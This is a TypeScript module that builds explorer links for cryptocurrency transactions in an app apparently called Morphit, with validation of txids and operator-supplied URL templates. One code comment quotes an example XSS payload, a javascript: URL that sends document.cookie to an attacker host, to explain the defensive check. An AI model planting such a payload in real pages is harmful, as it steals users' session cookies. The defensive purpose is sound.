/**
 * Morphit — external chain-explorer URL builders.
 *
 * For BTC and XMR transactions, link out to operator-configured
 * (or bundled-default) public block explorers.  Native Blurt
 * transactions get linked to our own /explorer route.
 *
 * Part 109 (priority-1 follow-up): the BTC and XMR templates are
 * operator-configurable via `MORPHIT_FRONTEND_{BTC,XMR}_CHAT_LINK_URL`,
 * which flows through `/v1/instance.chat_link_urls` into the
 * `instance` store and is consulted here on every call.  Privacy-
 * conscious operators may point users at self-hosted explorers
 * to keep IPs off third-party services.
 *
 * Bundled defaults are kept in `urlsCore.ts` (pure helpers, no
 * Svelte-store import — so node-side smoke tests can import the
 * regexes / substitution helper / validator without pulling in
 * SvelteKit's `$lib` alias resolver).
 *
 * The functions are pure given a template — they validate the
 * txid shape and refuse anything that doesn't match.  This
 * protects against UI injection where a hostile order's
 * `external_tx_id` field gets stuffed into a URL.
 */

import { getInstanceSnapshot } from '$lib/stores/instance';
import {
	BTC_TXID_RE,
	XMR_TXID_RE,
	BCH_TXID_RE,
	LTC_TXID_RE,
	DASH_TXID_RE,
	DOGE_TXID_RE,
	ZEC_TXID_RE,
	ARRR_TXID_RE,
	BLURT_TRXID_RE,
	ACCOUNT_NAME_RE,
	BUNDLED_BTC_CHAT_LINK_URL,
	BUNDLED_XMR_CHAT_LINK_URL,
	BUNDLED_BCH_CHAT_LINK_URL,
	BUNDLED_LTC_CHAT_LINK_URL,
	BUNDLED_DASH_CHAT_LINK_URL,
	BUNDLED_DOGE_CHAT_LINK_URL,
	BUNDLED_ZEC_CHAT_LINK_URL,
	BUNDLED_ARRR_CHAT_LINK_URL,
	substituteTxidIntoTemplate,
	isValidChatLinkTemplate
} from './urlsCore';
import {
	USDT_NETWORK_METADATA,
	bundledUsdtExplorerUrl,
	validateUsdtTxid,
	type UsdtNetwork,
	USDC_NETWORK_METADATA,
	bundledUsdcExplorerUrl,
	validateUsdcTxid,
	type UsdcNetwork,
	DAI_NETWORK_METADATA,
	bundledDaiExplorerUrl,
	validateDaiTxid,
	type DaiNetwork
} from '$lib/assets/networks';

export {
	BUNDLED_BTC_CHAT_LINK_URL,
	BUNDLED_XMR_CHAT_LINK_URL,
	BUNDLED_BCH_CHAT_LINK_URL,
	BUNDLED_LTC_CHAT_LINK_URL,
	BUNDLED_DASH_CHAT_LINK_URL,
	BUNDLED_DOGE_CHAT_LINK_URL,
	BUNDLED_ZEC_CHAT_LINK_URL,
	BUNDLED_ARRR_CHAT_LINK_URL
} from './urlsCore';

/** External (non-BLURT) asset tickers Morphit knows how to build
 *  explorer URLs for.  Uppercase to match the canonical asset
 *  registry's `AssetTicker` spelling. */
export type ExternalAsset = 'BTC' | 'XMR' | 'BCH' | 'LTC' | 'DASH' | 'DOGE' | 'ZEC' | 'ARRR';

/** Registry-driven dispatch for external-explorer URL building.
 *  Each entry pairs an asset's txid validator with the keys used
 *  to look up the operator's chosen template (with bundled
 *  fallback).
 *
 *  Adding a future trade-only asset's explorer link is a
 *  single-entry addition here PLUS adding the matching
 *  `chat_link_urls.<lowerTicker>` field to the instance store
 *  shape — no hardcoded `if (asset === '<TICKER>')` branches.
 *
 *  Per memory #23: trade-only assets (like a future USDT)
 *  cannot pay listing fees, but their txids may still appear
 *  in chat (buyer-to-seller payment evidence), and the chat
 *  ChatMessage component auto-links txids it recognizes.  The
 *  explorer-URL builder serves that path. */
interface ExplorerEntry {
	readonly txidRe: RegExp;
	readonly instanceTplKey: 'btc' | 'xmr' | 'bch' | 'ltc' | 'dash' | 'doge' | 'zec' | 'arrr';
	readonly bundledDefault: string;
}
const EXPLORER_REGISTRY: Readonly<Record<ExternalAsset, ExplorerEntry>> = Object.freeze({
	BTC: Object.freeze({
		txidRe: BTC_TXID_RE,
		instanceTplKey: 'btc',
		bundledDefault: BUNDLED_BTC_CHAT_LINK_URL
	}),
	XMR: Object.freeze({
		txidRe: XMR_TXID_RE,
		instanceTplKey: 'xmr',
		bundledDefault: BUNDLED_XMR_CHAT_LINK_URL
	}),
	BCH: Object.freeze({
		txidRe: BCH_TXID_RE,
		instanceTplKey: 'bch',
		bundledDefault: BUNDLED_BCH_CHAT_LINK_URL
	}),
	LTC: Object.freeze({
		txidRe: LTC_TXID_RE,
		instanceTplKey: 'ltc',
		bundledDefault: BUNDLED_LTC_CHAT_LINK_URL
	}),
	DASH: Object.freeze({
		txidRe: DASH_TXID_RE,
		instanceTplKey: 'dash',
		bundledDefault: BUNDLED_DASH_CHAT_LINK_URL
	}),
	DOGE: Object.freeze({
		txidRe: DOGE_TXID_RE,
		instanceTplKey: 'doge',
		bundledDefault: BUNDLED_DOGE_CHAT_LINK_URL
	}),
	ZEC: Object.freeze({
		txidRe: ZEC_TXID_RE,
		instanceTplKey: 'zec',
		bundledDefault: BUNDLED_ZEC_CHAT_LINK_URL
	}),
	ARRR: Object.freeze({
		txidRe: ARRR_TXID_RE,
		instanceTplKey: 'arrr',
		bundledDefault: BUNDLED_ARRR_CHAT_LINK_URL
	})
});

/** Builds an external-explorer URL for a non-Blurt asset's
 *  transaction.  Returns null on validation failure.
 *
 *  Reads the instance store synchronously for the operator's
 *  configured template.  When the store hasn't loaded yet (SSR,
 *  pre-hydration), or when the operator hasn't configured a
 *  template, falls back to the bundled default. */
export function externalExplorerUrl(asset: ExternalAsset, txid: string): string | null {
	if (typeof txid !== 'string') return null;
	const entry = EXPLORER_REGISTRY[asset];
	if (entry === undefined) return null;
	if (!entry.txidRe.test(txid)) return null;
	const lower = txid.toLowerCase();
	const operatorTpl = getInstanceSnapshot().chat_link_urls[entry.instanceTplKey];
	// cp30-DD-DD SEC-1 (defense-in-depth) — re-validate the
	// operator-supplied template before using it.  The indexer's
	// zod schema is supposed to catch malformed templates at
	// startup, but a hostile or compromised indexer could serve
	// anything; without this check, a value like
	// `javascript:fetch('https://attacker/'+document.cookie)`
	// would land in an `<a href={...}>` and execute on click.
	// On invalid-from-indexer, fall through to the bundled default
	// instead of producing the malicious URL.
	const tpl = operatorTpl !== null && operatorTpl !== undefined && isValidChatLinkTemplate(operatorTpl)
		? operatorTpl
		: entry.bundledDefault;
	return substituteTxidIntoTemplate(tpl, lower);
}

/** Builds the Morphit explorer URL for a Blurt transaction.
 *  Returns null on validation failure. */
export function morphitExplorerTxUrl(trxId: string): string | null {
	if (typeof trxId !== 'string' || !BLURT_TRXID_RE.test(trxId)) return null;
	return `/explorer/tx/${trxId.toLowerCase()}`;
}

/** Builds a USDT explorer URL for the given network + txid.
 *  Returns null on validation failure (wrong-shape txid for
 *  the network).
 *
 *  Reads the instance store's `chat_link_urls.usdt.<network>`
 *  override; falls back to the bundled default from
 *  `lib/assets/networks.ts` if the operator hasn't configured
 *  one.  Cross-network mismatch (a TRC-20 txid passed with
 *  network='erc20') gets validated out — `validateUsdtTxid`
 *  returns false for shape mismatches.
 *
 *  USDT-specific path because USDT is multi-network — the
 *  generic `externalExplorerUrl(asset, txid)` can't tell
 *  ERC-20 from TRC-20 from txid alone; the per-network
 *  builder takes the network explicitly to avoid ambiguity. */
export function usdtExplorerUrl(network: UsdtNetwork, txid: string): string | null {
	if (typeof txid !== 'string') return null;
	if (!validateUsdtTxid(network, txid)) return null;

	// Operator override path: read the instance store.
	const usdtOverrides = getInstanceSnapshot().chat_link_urls.usdt;
	const override = usdtOverrides ? usdtOverrides[network] : null;

	// cp30-DD-DD SEC-1 (defense-in-depth) — re-validate the
	// operator-supplied template before using it.  Without this,
	// a hostile/compromised indexer could serve a `javascript:`
	// URL that becomes an `<a href={...}>` and executes on click.
	// On validation failure, fall through to the bundled default
	// instead of substituting into the malicious template.
	if (override && isValidChatLinkTemplate(override)) {
		// Operator configured a per-network template — substitute
		// the txid into it.  Normalize the txid the same way the
		// bundled-default path does (cp30-DD-DD SEC-4):
		//   - SPL: base58 case-sensitive, no normalization
		//   - EVM family (erc20, bep20): lowercase + 0x prefix
		//   - TRC-20: lowercase, no prefix
		let normalized: string;
		if (network === 'spl') {
			normalized = txid;
		} else if (network === 'erc20' || network === 'bep20') {
			const lc = txid.toLowerCase();
			normalized = lc.startsWith('0x') ? lc : `0x${lc}`;
		} else {
			normalized = txid.toLowerCase();
		}
		return substituteTxidIntoTemplate(override, normalized);
	}

	// Fall back to bundled default.
	return bundledUsdtExplorerUrl(network, txid);
}

/** Builds the per-network USDC explorer URL.  Same shape as
 *  `usdtExplorerUrl` — operator override consulted first, bundled
 *  default from `lib/assets/networks.ts` if absent.  USDC-specific
 *  path because USDC is multi-network (Part 122 cp30) — the
 *  generic `externalExplorerUrl(asset, txid)` is for SINGLE-
 *  network external assets only. */
export function usdcExplorerUrl(network: UsdcNetwork, txid: string): string | null {
	if (typeof txid !== 'string') return null;
	if (!validateUsdcTxid(network, txid)) return null;

	const usdcOverrides = getInstanceSnapshot().chat_link_urls.usdc;
	const override = usdcOverrides ? usdcOverrides[network] : null;

	// cp30-DD-DD SEC-1 (defense-in-depth) — same XSS-protection
	// posture as usdtExplorerUrl above.
	if (override && isValidChatLinkTemplate(override)) {
		// cp30-DD-DD SEC-4 — EVM-family normalization (USDC has no
		// TRC-20 / BEP-20 branches; only SPL is non-EVM here).
		let normalized: string;
		if (network === 'spl') {
			normalized = txid;
		} else {
			// erc20, base, polygon — all EVM-family
			const lc = txid.toLowerCase();
			normalized = lc.startsWith('0x') ? lc : `0x${lc}`;
		}
		return substituteTxidIntoTemplate(override, normalized);
	}

	return bundledUsdcExplorerUrl(network, txid);
}

/** Builds the per-network DAI explorer URL.  Same shape as
 *  `usdcExplorerUrl` — operator override consulted first, bundled
 *  default from `lib/assets/networks.ts` if absent.  DAI-specific
 *  path because DAI is multi-network (Part 122 cp31) — 4 EVM
 *  networks (ERC-20, Polygon, Base, Arbitrum), no SPL.  Simpler
 *  normalization than USDC because there's no case-sensitive SPL
 *  branch to preserve. */
export function daiExplorerUrl(network: DaiNetwork, txid: string): string | null {
	if (typeof txid !== 'string') return null;
	if (!validateDaiTxid(network, txid)) return null;

	const daiOverrides = getInstanceSnapshot().chat_link_urls.dai;
	const override = daiOverrides ? daiOverrides[network] : null;

	// cp30-DD-DD SEC-1 (defense-in-depth) — same XSS-protection
	// posture as usdtExplorerUrl + usdcExplorerUrl above.  Hostile
	// indexer serving `javascript:...` template would be rejected
	// here and the bundled default would be used instead.
	if (override && isValidChatLinkTemplate(override)) {
		// cp30-DD-DD SEC-4 — EVM-family normalization (all 4 DAI
		// networks are EVM; no SPL/TRC-20 branch).  Etherscan,
		// Polygonscan, Basescan, Arbiscan all return 404 to
		// bare-hex; emit canonical 0x-prefixed lowercase.
		const lc = txid.toLowerCase();
		const normalized = lc.startsWith('0x') ? lc : `0x${lc}`;
		return substituteTxidIntoTemplate(override, normalized);
	}

	return bundledDaiExplorerUrl(network, txid);
}

/** Builds the Morphit explorer URL for a Blurt account.
 *  Returns null on validation failure. */
export function morphitExplorerAccountUrl(account: string): string | null {
	if (typeof account !== 'string' || !ACCOUNT_NAME_RE.test(account)) return null;
	return `/explorer/account/${account}`;
}

/** Builds the Morphit explorer URL for a Blurt block. */
export function morphitExplorerBlockUrl(blockNumber: number): string | null {
	if (
		typeof blockNumber !== 'number' ||
		!Number.isFinite(blockNumber) ||
		!Number.isInteger(blockNumber) ||
		blockNumber < 1
	) {
		return null;
	}
	return `/explorer/block/${blockNumber}`;
}

/** Fallback URL on `blocks.blurtwallet.com` for users who want a
 *  second-source view.  Used when our own explorer can't resolve
 *  a target (e.g. RPC error, or a deeply historical op our
 *  walking depth didn't reach).
 *
 *  Per the user: this is the ONLY external Blurt explorer we
 *  link to; blockchain.blurt.world doesn't exist. */
export function blurtWalletExplorerFallbackUrl(
	kind: 'tx' | 'account' | 'block',
	target: string | number
): string | null {
	const base = 'https://blocks.blurtwallet.com';
	if (kind === 'tx') {
		if (typeof target !== 'string' || !BLURT_TRXID_RE.test(target)) return null;
		return `${base}/tx/${target.toLowerCase()}`;
	}
	if (kind === 'account') {
		if (typeof target !== 'string' || !ACCOUNT_NAME_RE.test(target)) return null;
		// blocks.blurtwallet.com uses fragment routing: /#/@account
		return `${base}/#/@${target}`;
	}
	if (kind === 'block') {
		if (typeof target !== 'number' || !Number.isInteger(target) || target < 1) {
			return null;
		}
		return `${base}/b/${target}`;
	}
	return null;
}
